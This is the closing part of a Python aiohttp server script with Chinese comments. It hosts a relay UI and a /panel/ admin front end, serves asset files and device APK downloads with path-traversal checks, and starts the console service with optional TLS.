        ('/assets/zgl-light-final.js', 'relay/assets/zgl-light-final.js', 'application/javascript'),
    ]
    mounted = 0
    for path, rel, ct in routes:
        if os.path.exists(os.path.join(WEB_DIR, rel)):
            app.router.add_get(path, _serve_file(rel, ct))
            mounted += 1

    def _shell_html(rel):
        fp = os.path.join(WEB_DIR, rel)
        if not os.path.exists(fp):
            return None
        return web.Response(body=open(fp, 'rb').read(), content_type='text/html')

    # 根路径：默认中继通道；来自 /panel* 的跳转（主通道 401 拦截器 / 退出 / 返回 都硬跳 "/"）→ 302 回 /panel/
    # （主通道前端 basename 是 /panel，直接把壳渲染在 "/" 会因 basename 不匹配而白屏）
    async def root(request):
        ref = request.headers.get('Referer', '') or ''
        if '/panel' in ref:
            raise web.HTTPFound('/panel/')
        resp = _shell_html('relay/index.html')
        return resp if resp is not None else web.Response(status=404, text='ui missing')

    app.router.add_get('/', root)
    mounted += 1

    # SPA 兜底：非 /api 的未命中路径一律交回原版壳（客户端路由 /login、/list 等）
    # KNOWN 在下面填好（已注册的具体路由表），兜底据此区分「路径不存在」与「方法不对」
    KNOWN = {}

    async def spa_fallback(request):
        p = request.path
        if p in KNOWN:
            # 路径真实存在、只是方法没实现 —— 回 405 并给出 Allow（与 api_impl 的 405 语义一致）
            allow = sorted(m for m in KNOWN[p] if m not in ('*', 'HEAD'))
            return web.json_response({'ok': False, 'error': 'method_not_allowed', 'allow': allow},
                                     status=405)
        if p.startswith('/api/') or p.startswith('/ws'):
            return web.Response(status=404, text='404')
        # 只对 GET/HEAD 回壳：其它方法落到这里说明路径也不存在，回 404
        # （原来只注册 GET，POST 未命中路径会被 aiohttp 自动回 405 + Allow: GET，
        #   等于告诉对方"这个路径存在但方法不对"，是误导性的探测信号 —— 见 F-74）
        if request.method not in ('GET', 'HEAD'):
            return web.Response(status=404, text='404')
        # 主通道前端 base=/panel/，客户端路由 /panel/devices|users|ai/... 深链必须回主通道壳。
        # 主通道包内的 401 拦截器与「退出/返回」写的是硬跳 window.location.href="/"（原站 / 即主通道登录），
        # 而本实现里 / 归中继通道，两套界面同 origin —— 用 Referer 判定来源：来自 /panel* 的跳转回主通道。
        ref = request.headers.get('Referer', '') or ''
        if '/panel' in ref and p in ('/', '/login'):
            raise web.HTTPFound('/panel/')     # basename=/panel，必须落在 /panel/ 才不会白屏
        rel = 'panel/index.html' if p.startswith('/panel') else 'relay/index.html'
        fp = os.path.join(WEB_DIR, rel)
        if not os.path.exists(fp):
            return web.Response(status=404, text='ui missing')
        return web.Response(body=open(fp, 'rb').read(), content_type='text/html')

    # 通用静态：/assets/<file> 与 /relay/assets/<file> 都指向本地 chunk 目录
    async def assets_generic(request):
        name = request.match_info.get('name', '')
        name = os.path.basename(name)          # 防目录穿越
        fp = os.path.join(WEB_DIR, 'relay', 'assets', name)
        if not os.path.exists(fp):
            return web.Response(status=404, text='404')
        ct = ('application/javascript' if name.endswith('.js') else
              'text/css' if name.endswith('.css') else
              'image/svg+xml' if name.endswith('.svg') else
              'image/png' if name.endswith('.png') else 'application/octet-stream')
        return web.Response(body=open(fp, 'rb').read(), content_type=ct)

    # 给设备端下载用的 APK 直出；允许 build/ 下安全文件名，避免所有构建共用 labagent.apk 被 CDN 缓存。
    DL_OK = {'labagent.apk', 'labprobe.apk'}

    async def dl_file(request):
        name = os.path.basename(request.match_info.get('name', ''))
        if not (name in DL_OK or re.match(r'^[A-Za-z0-9_-]+\.apk$', name)):
            return web.Response(status=404, text='404')
        fp = os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', 'build', name)
        if not os.path.exists(fp):
            return web.Response(status=404, text='404')
        data = open(fp, 'rb').read()
        return web.Response(body=data, content_type='application/vnd.android.package-archive',
                            headers={'Content-Length': str(len(data)),
                                     'Cache-Control': 'no-store, no-cache, must-revalidate, max-age=0',
                                     'Content-Disposition': 'attachment; filename=%s' % name})

    app.router.add_get('/dl/{name}', dl_file)

    app.router.add_get('/assets/{name}', assets_generic)
    app.router.add_get('/relay/assets/{name}', assets_generic)

    # Builder preset icons are referenced by absolute /static URLs from the
    # panel bundle. Serve the checked-in files directly so previews and builds
    # use the same bytes.
    async def preset_icon(request):
        name = os.path.basename(request.match_info.get('name', ''))
        if not re.match(r'^[A-Za-z0-9_.-]+\.(?:png|webp|jpe?g)$', name, re.I):
            return web.Response(status=404, text='404')
        fp = os.path.join(WEB_DIR, 'static', 'preset_icons', name)
        if not os.path.isfile(fp):
            return web.Response(status=404, text='404')
        ext = os.path.splitext(name)[1].lower()
        ct = {'png': 'image/png', 'webp': 'image/webp',
              'jpg': 'image/jpeg', 'jpeg': 'image/jpeg'}.get(ext.lstrip('.'),
                                                           'application/octet-stream')
        return web.Response(body=open(fp, 'rb').read(), content_type=ct,
                            headers={'Cache-Control': 'public, max-age=3600'})

    app.router.add_get('/static/preset_icons/{name}', preset_icon)

    # 主通道前端资源目录（base=/panel/ 下引用的 /panel/assets/*）
    async def panel_assets(request):
        name = os.path.basename(request.match_info.get('name', ''))
        fp = os.path.join(WEB_DIR, 'panel', 'assets', name)
        if not os.path.exists(fp):
            return web.Response(status=404, text='404')
        ct = ('application/javascript' if name.endswith('.js') else
              'text/css' if name.endswith('.css') else
              'image/svg+xml' if name.endswith('.svg') else
              'image/png' if name.endswith('.png') else 'application/octet-stream')
        return web.Response(body=open(fp, 'rb').read(), content_type=ct)

    app.router.add_get('/panel/assets/{name}', panel_assets)
    mounted += 3
    # 已知路由表：路径 -> 允许的方法（跳过兜底自身与带变量的资源）
    for _r in app.router.routes():
        _p = getattr(_r, 'path', None) or getattr(getattr(_r, 'resource', None), 'canonical', None)
        if not _p or _p == '/{tail:.*}' or '{' in _p:
            continue
        KNOWN.setdefault(_p, set()).add(getattr(_r, 'method', '*'))

    # 兜底注册**所有方法**：否则 POST/PUT/DELETE 打到未注册路径时，aiohttp 会因为
    # "路径匹配但方法不允许"自动回 405（Allow: GET），把"路径不存在"伪装成"方法不对"（见 F-74）
    app.router.add_route('*', '/{tail:.*}', spa_fallback)
    mounted += 1
    print('[server] 原版前端托管：%d 条静态路由（/ 与 /relay/ 为中继通道，/panel/ 为主通道）' % mounted)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('--host', default='127.0.0.1')
    ap.add_argument('--port', type=int, default=8788)
    ap.add_argument('--tls-cert', default='', help='证书路径（与 --tls-key 同时给出即启用 HTTPS）')
    ap.add_argument('--tls-key', default='', help='私钥路径')
    a = ap.parse_args()
    scheme = 'http'
    ssl_ctx = None
    if a.tls_cert and a.tls_key:
        import ssl as _ssl
        ssl_ctx = _ssl.SSLContext(_ssl.PROTOCOL_TLS_SERVER)
        ssl_ctx.load_cert_chain(a.tls_cert, a.tls_key)
        scheme = 'https'
    print('[server] 控制台服务启动 %s://%s:%d' % (scheme, a.host, a.port))
    if scheme == 'https':
        # 原版前端多处把实时通道写死成 wss://（overview.module.js / index.html 的面板通道）；
        # 只有 HTTPS 部署下它才连得上，所以本地要跑"和线上一样"的形态就得起 TLS（见 F-77 附带）
        print('[server] 已启用 TLS（自签证书时浏览器会提示不受信任，属预期）')
    print('[server] 运营账号 %s / %s' % (OPERATOR_USER, OPERATOR_PASS))
    web.run_app(build_app(), host=a.host, port=a.port, print=None, ssl_context=ssl_ctx)


if __name__ == '__main__':
    main()
